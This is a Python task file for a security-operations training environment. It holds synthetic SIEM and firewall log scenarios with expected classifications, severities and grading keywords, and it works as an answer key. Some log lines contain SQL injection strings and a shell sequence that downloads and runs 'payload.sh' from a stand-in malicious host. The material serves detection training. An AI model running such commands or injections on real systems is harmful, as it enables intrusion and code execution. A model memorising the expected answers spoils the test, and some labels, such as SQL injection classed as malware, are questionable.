"""
Log Analysis Task - Medium Security Task.

Analyze firewall/SIEM logs and classify security alerts.
"""

import random
from typing import Any, Dict, List, Optional, Tuple
from secops_env.models import SecOpsAction, TaskDifficulty, ActionType


class LogAnalysisTask:
    """
    Log Analysis Task - Medium Difficulty.

    Objective: Analyze firewall/SIEM logs and classify security alerts.

    Success Criteria:
    - Correct classification of log entries
    - Accurate severity assessment
    - Clear reasoning provided

    Reward Structure:
    - +0.5 for correct classification
    - +0.25 for correct severity
    - +0.25 for adequate reasoning
    """

    SCENARIOS = [
        {
            "logs": """2026-03-28 10:15:23 FIREWALL BLOCK 192.168.1.100 → 8.8.8.8:443 PROTO:TCP
2026-03-28 10:15:24 FIREWALL BLOCK 192.168.1.100 → 45.33.32.156:22 PROTO:TCP
2026-03-28 10:15:25 FIREWALL ALLOW 192.168.1.100 → 10.0.0.5:443 PROTO:TCP""",
            "classification": "LATERAL_MOVEMENT",
            "severity": "HIGH",
            "reasoning_keywords": [
                "multiple",
                "blocked",
                "external",
                "internal",
                "communication",
            ],
        },
        {
            "logs": """2026-03-28 14:22:10 IDS ALERT [SQL_INJECTION] 203.0.113.42 → 10.0.1.50:3306 SELECT * FROM users WHERE id=1 OR 1=1
2026-03-28 14:22:11 FIREWALL BLOCK 203.0.113.42 → 10.0.1.50:3306
2026-03-28 14:22:15 IDS ALERT [SQL_INJECTION] 203.0.113.42 → 10.0.1.50:3306 UNION SELECT password FROM admin""",
            "classification": "MALWARE",
            "severity": "CRITICAL",
            "reasoning_keywords": [
                "sql",
                "injection",
                "attack",
                "malicious",
                "database",
            ],
        },
        {
            "logs": """2026-03-28 08:00:00 WAF ALLOWED /api/healthcheck from 10.0.0.10:8080
2026-03-28 08:00:01 WAF ALLOWED /api/status from 10.0.0.10:8080
2026-03-28 08:00:02 WAF ALLOWED /api/metrics from 10.0.0.10:8080
2026-03-28 08:00:03 WAF ALLOWED /api/ping from 10.0.0.10:8080""",
            "classification": "FALSE_POSITIVE",
            "severity": "LOW",
            "reasoning_keywords": [
                "healthcheck",
                "normal",
                "allowed",
                "benign",
                "regular",
            ],
        },
        {
            "logs": """2026-03-28 16:45:00 CLOUDTRAIL CreateUser: arn:aws:iam::123456789:user/admin_temp
2026-03-28 16:45:30 IAM AttachUserPolicy: admin_temp → AdministratorAccess
2026-03-28 16:46:00 CLOUDTRAIL CreateAccessKey: admin_temp
2026-03-28 16:46:30 CLOUDTRAIL GetBucketAcl: s3://confidential-data""",
            "classification": "UNAUTHORIZED_ACCESS",
            "severity": "CRITICAL",
            "reasoning_keywords": [
                "privilege",
                "escalation",
                "admin",
                "temp",
                "suspicious",
            ],
        },
        {
            "logs": """2026-03-28 11:30:00 DNS QUERY malicious-domain.com from 192.168.1.50
2026-03-28 11:30:05 DNS QUERY c2-server.evil.com from 192.168.1.50
2026-03-28 11:30:10 NETWORK BLOCK 192.168.1.50 → malicious-domain.com:443
2026-03-28 11:30:15 ENDPOINT PROTECT blocked process: cmd.exe spawned from word.exe""",
            "classification": "MALWARE",
            "severity": "CRITICAL",
            "reasoning_keywords": [
                "c2",
                "command",
                "control",
                "malware",
                "dns",
                "blocked",
            ],
        },
        {
            "logs": """2026-03-28 09:15:00 VPN LOGIN_SUCCESS user@contractor.com from 203.0.113.50
2026-03-28 09:15:30 VPN LOGIN_SUCCESS user@contractor.com from 198.51.100.25
2026-03-28 09:16:00 VPN LOGIN_SUCCESS user@contractor.com from 192.0.2.100
2026-03-28 09:16:30 VPN LOGIN_FAILED user@contractor.com from 203.0.113.50""",
            "classification": "UNAUTHORIZED_ACCESS",
            "severity": "HIGH",
            "reasoning_keywords": [
                "geolocation",
                "impossible",
                "travel",
                "credential",
                "theft",
            ],
        },
        {
            "logs": """2026-03-28 13:00:00 S3 ACCESS_DENIED arn:aws:iam::123456:user/data Scientist from 10.0.2.30
2026-03-28 13:05:00 S3 ACCESS_DENIED arn:aws:iam::123456:user/data Scientist from 10.0.2.30
2026-03-28 13:10:00 S3 ACCESS_DENIED arn:aws:iam::123456:user/data Scientist from 10.0.2.30
2026-03-28 13:15:00 S3 DOWNLOAD_SUCCESS arn:aws:iam::123456:user:analyst from 10.0.2.31""",
            "classification": "TRUE_POSITIVE",
            "severity": "MEDIUM",
            "reasoning_keywords": ["brute", "force", "access", "denied", "repeated"],
        },
        {
            "logs": """2026-03-28 02:30:00 AUTH_SUCCESS admin@company.com from 10.0.0.5
2026-03-28 02:30:01 SHELL_CMD admin@company.com: ls /tmp
2026-03-28 02:30:02 SHELL_CMD admin@company.com: wget http://malicious.site/payload.sh
2026-03-28 02:30:03 SHELL_CMD admin@company.com: chmod +x payload.sh && ./payload.sh""",
            "classification": "MALWARE",
            "severity": "CRITICAL",
            "reasoning_keywords": [
                "unusual",
                "time",
                "malicious",
                "download",
                "reverse",
                "shell",
            ],
        },
        {
            "logs": """2026-03-28 18:00:00 HTTP 200 GET /images/logo.png from 203.0.113.10
2026-03-28 18:00:01 HTTP 200 GET /css/style.css from 203.0.113.10
2026-03-28 18:00:02 HTTP 200 GET /js/app.js from 203.0.113.10
2026-03-28 18:00:03 HTTP 200 GET /api/products from 203.0.113.10""",
            "classification": "FALSE_POSITIVE",
            "severity": "LOW",
            "reasoning_keywords": ["normal", "web", "traffic", "benign", "legitimate"],
        },
        {
            "logs": """2026-03-28 17:45:00 AWS_CLOUDWATCH unusual_api_activity in region us-east-1
2026-03-28 17:45:30 API_CALL DescribeInstances from unknown_iam_user
2026-03-28 17:46:00 API_CALL ListBuckets from unknown_iam_user
2026-03-28 17:46:30 API_CALL GetObject from sensitive-bucket/sensitive-file.csv""",
            "classification": "DATA_EXFILTRATION",
            "severity": "CRITICAL",
            "reasoning_keywords": [
                "data",
                "exfiltration",
                "unauthorized",
                "sensitive",
                "bucket",
            ],
        },
        {
            "logs": """2026-03-28 10:00:00 FIREWALL ALLOW 192.168.1.10 → 10.0.0.5:443
2026-03-28 10:00:01 FIREWALL ALLOW 192.168.1.11 → 10.0.0.5:443
2026-03-28 10:00:02 FIREWALL ALLOW 192.168.1.12 → 10.0.0.5:443
2026-03-28 10:00:03 FIREWALL ALLOW 192.168.1.13 → 10.0.0.5:443""",
            "classification": "FALSE_POSITIVE",
            "severity": "LOW",
            "reasoning_keywords": [
                "normal",
                "internal",
                "communication",
                "load",
                "balancer",
            ],
        },
        {
            "logs": """2026-03-28 15:30:00 SSH BRUTE_FORCE from 198.51.100.50 to 10.0.1.20:22
2026-03-28 15:30:01 SSH AUTH_FAILED root from 198.51.100.50
2026-03-28 15:30:02 SSH AUTH_FAILED admin from 198.51.100.50
2026-03-28 15:30:03 SSH AUTH_FAILED administrator from 198.51.100.50
2026-03-28 15:30:10 FIREWALL BLOCK 198.51.100.50 → 10.0.1.20:22""",
            "classification": "TRUE_POSITIVE",
            "severity": "HIGH",
            "reasoning_keywords": [
                "brute",
                "force",
                "ssh",
                "attack",
                "blocked",
                "authentication",
            ],
        },
        {
            "logs": """2026-03-28 12:00:00 BACKUP_SUCCESS s3://backup-bucket/2026-03-28 from 10.0.0.100
2026-03-28 12:15:00 BACKUP_SUCCESS s3://backup-bucket/2026-03-28 from 10.0.0.100
2026-03-28 12:30:00 BACKUP_SUCCESS s3://backup-bucket/2026-03-28 from 10.0.0.100
2026-03-28 12:45:00 BACKUP_COMPLETE Total: 50GB, Duration: 45min""",
            "classification": "FALSE_POSITIVE",
            "severity": "LOW",
            "reasoning_keywords": [
                "backup",
                "normal",
                "scheduled",
                "success",
                "benign",
            ],
        },
        {
            "logs": """2026-03-28 20:00:00 EGRESS_BLOCKED 192.168.1.50 → 45.33.32.156:8080
2026-03-28 20:01:00 EGRESS_BLOCKED 192.168.1.51 → 45.33.32.156:8080
2026-03-28 20:02:00 EGRESS_BLOCKED 192.168.1.52 → 45.33.32.156:8080
2026-03-28 20:03:00 ENDPOINT_ALERT Cryptocurrency mining detected on host 192.168.1.50""",
            "classification": "MALWARE",
            "severity": "CRITICAL",
            "reasoning_keywords": [
                "crypto",
                "mining",
                "egress",
                "blocked",
                "malware",
                "coinhive",
            ],
        },
        {
            "logs": """2026-03-28 09:00:00 VPN_LOGIN user@company.com from 203.0.113.1 (New York)
2026-03-28 09:30:00 VPN_LOGIN user@company.com from 192.0.2.50 (London)
2026-03-28 10:00:00 VPN_LOGIN user@company.com from 198.51.100.75 (Tokyo)
2026-03-28 10:30:00 VPN_LOGIN user@company.com from 203.0.113.1 (New York)""",
            "classification": "UNAUTHORIZED_ACCESS",
            "severity": "HIGH",
            "reasoning_keywords": [
                "impossible",
                "travel",
                "credential",
                "compromise",
                "geographic",
            ],
        },
        {
            "logs": """2026-03-28 14:00:00 WAF_BLOCK [XSS] POST /comment from 203.0.113.20
2026-03-28 14:00:01 WAF_BLOCK [XSS] POST /comment from 203.0.113.20
2026-03-28 14:00:02 WAF_BLOCK [SQLI] POST /login from 203.0.113.20
2026-03-28 14:00:03 FIREWALL DROP 203.0.113.20""",
            "classification": "TRUE_POSITIVE",
            "severity": "MEDIUM",
            "reasoning_keywords": ["web", "attack", "xss", "sqli", "waf", "blocked"],
        },
        {
            "logs": """2026-03-28 08:30:00 CRON_JOB mail_archiver executed successfully
2026-03-28 08:30:01 CRON_JOB log_rotator executed successfully
2026-03-28 08:30:02 CRON_JOB backup_scheduler executed successfully
2026-03-28 08:30:03 CRON_JOB cleanup_temp executed successfully""",
            "classification": "FALSE_POSITIVE",
            "severity": "LOW",
            "reasoning_keywords": [
                "cron",
                "scheduled",
                "normal",
                "maintenance",
                "benign",
            ],
        },
        {
            "logs": """2026-03-28 22:00:00 PORT_SCAN detected from 198.51.100.100 to 10.0.1.0/24
2026-03-28 22:00:01 PORT_SCAN TCP:22 open on 10.0.1.10
2026-03-28 22:00:02 PORT_SCAN TCP:80 open on 10.0.1.15
2026-03-28 22:00:03 PORT_SCAN TCP:443 open on 10.0.1.20
2026-03-28 22:00:04 IDS ALERT [RECONNAISSANCE] Port scan detected""",
            "classification": "TRUE_POSITIVE",
            "severity": "HIGH",
            "reasoning_keywords": [
                "port",
                "scan",
                "reconnaissance",
                "discovery",
                "attack",
                "preparation",
            ],
        },
        {
            "logs": """2026-03-28 11:00:00 EMAIL_SCAN Clean email from trusted@example.com
2026-03-28 11:00:01 EMAIL_SCAN Clean email from colleague@company.com
2026-03-28 11:00:02 EMAIL_SCAN Clean email from noreply@vendor.net
2026-03-28 11:00:03 EMAIL_SCAN Clean email from team@partner.io""",
            "classification": "FALSE_POSITIVE",
            "severity": "LOW",
            "reasoning_keywords": ["email", "clean", "normal", "benign", "legitimate"],
        },
        {
            "logs": """2026-03-28 03:00:00 RATE_LIMIT_EXCEEDED API /api/search from 203.0.113.30
2026-03-28 03:00:01 RATE_LIMIT_EXCEEDED API /api/search from 203.0.113.30
2026-03-28 03:00:02 RATE_LIMIT_EXCEEDED API /api/search from 203.0.113.30
2026-03-28 03:00:03 RATE_LIMIT_TRIGGERED Blocking IP 203.0.113.30""",
            "classification": "NEEDS_INVESTIGATION",
            "severity": "MEDIUM",
            "reasoning_keywords": [
                "rate",
                "limit",
                "api",
                "possibly",
                "dos",
                "legitimate",
            ],
        },
    ]

    def __init__(self, difficulty: Optional[str] = None):
        """Initialize the log analysis task."""
        self.max_steps = 6
        self.difficulty = (
            TaskDifficulty.MEDIUM if difficulty is None else TaskDifficulty(difficulty)
        )
        self.objective = "Analyze the provided security logs and classify the security alert with appropriate severity and reasoning."

        self._logs = ""
        self._expected_classification = ""
        self._expected_severity = ""
        self._reasoning_keywords: List[str] = []
        self._submitted_classification = ""
        self._submitted_severity = ""
        self._submitted_reasoning = ""
        self._total_issues = 1

    def generate_scenario(self) -> Dict[str, Any]:
        """Generate a log analysis scenario."""
        scenario = random.choice(self.SCENARIOS)

        self._logs = scenario["logs"]
        self._expected_classification = scenario["classification"]
        self._expected_severity = scenario["severity"]
        self._reasoning_keywords = scenario.get("reasoning_keywords", [])
        self._submitted_classification = ""
        self._submitted_severity = ""
        self._submitted_reasoning = ""

        return {
            "logs": self._logs,
            "instructions": "Classify the security event as one of: MALWARE, TRUE_POSITIVE, FALSE_POSITIVE, NEEDS_INVESTIGATION, LATERAL_MOVEMENT, DATA_EXFILTRATION, UNAUTHORIZED_ACCESS, BENIGN. Assign severity: LOW, MEDIUM, HIGH, CRITICAL.",
        }

    def execute_action(
        self, action: SecOpsAction, grader, task_data: Dict[str, Any]
    ) -> Tuple[float, str, bool, bool]:
        """
        Execute a log analysis action.

        Returns:
            Tuple of (reward, feedback, done, success)
        """
        reward = 0.0
        feedback = ""
        done = False
        success = False

        if action.action_type == ActionType.ANALYZE:
            feedback = "Analyzing security logs for suspicious activity..."

        elif action.action_type == ActionType.CLASSIFY:
            self._submitted_classification = action.classification or ""
            self._submitted_severity = action.severity or ""
            self._submitted_reasoning = action.reasoning or ""

            score = grader.grade_full_analysis(
                classification=self._submitted_classification,
                severity=self._submitted_severity,
                reasoning=self._submitted_reasoning,
                expected_classification=self._expected_classification,
                expected_severity=self._expected_severity,
                expected_reasoning_keywords=self._reasoning_keywords,
            )
            reward = score * 0.5
            feedback = f"Classification submitted. Assessment score: {score:.2f}"

        elif action.action_type == ActionType.PRIORITIZE:
            self._submitted_severity = action.severity or ""
            class_score = grader.grade_classification(
                self._submitted_classification or action.classification,
                self._expected_classification,
            )
            severity_score = grader.grade_severity(
                self._submitted_severity, self._expected_severity
            )
            reward = (class_score * 0.5 + severity_score * 0.5) * 0.3
            feedback = f"Priority assigned. Severity accuracy: {severity_score:.2f}"

        elif action.action_type == ActionType.FINALIZE:
            self._submitted_classification = (
                action.classification or self._submitted_classification
            )
            self._submitted_severity = action.severity or self._submitted_severity
            self._submitted_reasoning = action.reasoning or self._submitted_reasoning

            score = grader.grade_full_analysis(
                classification=self._submitted_classification,
                severity=self._submitted_severity,
                reasoning=self._submitted_reasoning,
                expected_classification=self._expected_classification,
                expected_severity=self._expected_severity,
                expected_reasoning_keywords=self._reasoning_keywords,
            )
            reward = score

            if score >= 0.9:
                feedback = f"Excellent analysis! Score: {score:.2f}. Classification: {self._submitted_classification}, Severity: {self._submitted_severity}"
                success = True
                done = True
            elif score >= 0.5:
                feedback = f"Good analysis. Score: {score:.2f}. Review the event classification."
            else:
                feedback = f"Incomplete analysis. Score: {score:.2f}. Consider different classification."

        else:
            feedback = f"Unknown action type: {action.action_type}"

        return reward, feedback, done, success

    def get_info(self) -> Dict[str, Any]:
        """Get current task information."""
        return {
            "difficulty": self.difficulty,
            "objective": self.objective,
            "detected_issues": [self._submitted_classification]
            if self._submitted_classification
            else [],
            "fixed_issues": [],
            "total_issues": self._total_issues,
        }

    def get_state(self) -> Dict[str, Any]:
        """Get current task state."""
        return {
            "logs_length": len(self._logs),
            "expected_classification": self._expected_classification,
            "submitted_classification": self._submitted_classification,
            "expected_severity": self._expected_severity,
            "submitted_severity": self._submitted_severity,
            "has_reasoning": bool(self._submitted_reasoning),
        }
